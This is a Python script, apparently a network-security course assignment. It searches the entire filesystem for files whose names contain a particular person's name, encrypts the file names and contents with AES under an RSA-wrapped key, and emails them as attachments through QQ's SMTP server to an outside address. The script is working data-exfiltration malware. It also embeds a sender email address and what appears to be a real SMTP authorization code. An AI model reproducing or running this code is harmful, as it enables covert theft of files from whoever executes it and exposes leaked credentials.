#encoding=utf-8
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import  encoders
import os
import string
import random
from Crypto import Random
from Crypto.Hash import SHA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
from Crypto.Signature import PKCS1_v1_5 as Signature_pkcs1_v1_5
from Crypto.PublicKey import RSA
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
import base64
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
#AES填充
def add_to_16(text):
    if len(text) % 16:
        add = 16 - (len(text) % 16)
    else:
        add = 0
    text = text + ('\0' * add)
    return text
# AES加密函数
def encrypt(text,key):
    key = key.encode('utf-8')
    mode = AES.MODE_ECB
    text = add_to_16(text)
    cryptos = AES.new(key, mode)

    cipher_text = cryptos.encrypt(text)
    return b2a_hex(cipher_text)
#查找包含姓名的文件
file_path=[]
for root, dirs, files in os.walk(r"/"):
    try:
        for file in files:
            if file.find("luanzhiheng")>=0:
                file_path.append(os.path.join(root, file))
    except Exception:
        pass
    continue
msg_from = '2186231286@qq.com'  # 发送方邮箱
passwd = 'zptrusebacaeebei'  # 填入发送方邮箱的授权码(填入自己的授权码，相当于邮箱密码)
msg_to = ['813956323@qq.com']  # 收件人邮箱
#随机生成字符串
def ranstr(num):
    H = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

    salt = ''
    for i in range(num):
        salt += random.choice(H)

    return salt
#生成AES密钥
message= ranstr(16)
#对AES密钥进行加密
with open('public.pem',"r") as f:
     key = f.read()
     rsakey = RSA.importKey(key)  # 导入读取到的公钥
     cipher = Cipher_pkcs1_v1_5.new(rsakey)  # 生成对象
     cipher_text = base64.b64encode(cipher.encrypt(message.encode(encoding="utf-8")))

subject = "网络安全期末大作业"  # 主题
# 创建一个带附件的实例
msg = MIMEMultipart()
# 放入邮件主题
msg['Subject'] = subject

# 放入发件人
msg['From'] = msg_from

# 把AES密钥放入邮件正文内容
msg.attach(MIMEText(cipher_text, 'plain', 'utf-8'))
def addAttach(apath, filename):
    with open(apath, 'rb') as fp:
        attach = MIMEBase('application', 'octet-stream')
        filename=encrypt(filename,message)#对文件名加密
        content=fp.read()
        attach.set_payload(encrypt(content,message))#对文件内容加密
        attach.add_header('Content-Disposition', 'attachment', filename=filename)
        encoders.encode_base64(attach)
        fp.close()
        return attach
# 构造附件，传送列表中搜索到的文件
for path in file_path:
    filename=path.strip().split('/')[-1]
    attach=addAttach(path,filename)
    msg.attach(attach)

try:
    # 通过普通方式发送
    s = smtplib.SMTP("smtp.qq.com", 587)
    # 登录到邮箱
    s.ehlo()
    s.login(msg_from, passwd)
    # 发送邮件：发送方，收件方，要发送的消息
    s.sendmail(msg_from, msg_to, msg.as_string())
    print('成功')
except Exception as e:
    print(e)
finally:
    pass
